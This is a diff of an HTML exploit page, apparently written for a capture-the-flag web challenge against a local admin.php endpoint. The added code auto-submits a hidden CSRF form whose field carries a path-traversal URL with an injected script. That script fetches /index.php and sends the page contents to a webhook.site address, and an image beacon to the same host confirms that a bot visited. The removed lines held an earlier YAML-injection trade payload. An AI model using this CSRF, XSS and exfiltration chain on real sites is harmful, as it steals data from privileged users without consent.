@@ -4,26 +4,20 @@
   <meta charset="utf-8">
 </head>
 <body>
+  <!-- Bot visit confirmation -->
   <img src="https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26/beacon">
 
-  <form id="f" action="http://localhost:5000/admin.php" method="POST" target="hiddenFrame">
-    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=- amount: 1000000
-  currency: ZZZ
-  op: BUY
-- amount: 1000000
-  currency: ZZZ
-  op: SELL
-- amount: 1
-  currency: FL
-  op: BUY">
+  <!-- CSRF payload -->
+  <form id="f" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url" value="http://localhost:5000/admin.php/../index.php?html=<script>
+fetch('/index.php').then(r=>r.text()).then(d=>{
+  location.href='https://webhook.site/bb019f0d-32f0-4ed4-bc65-b29a133afa26/?leak='+encodeURIComponent(d)
+})
+</script>">
   </form>
 
-  <iframe name="hiddenFrame" style="display:none;"></iframe>
-
   <script>
-    setTimeout(() => {
-      document.getElementById('f').submit();
-    }, 1000);
+    document.getElementById('f').submit();
   </script>
 </body>
 </html>
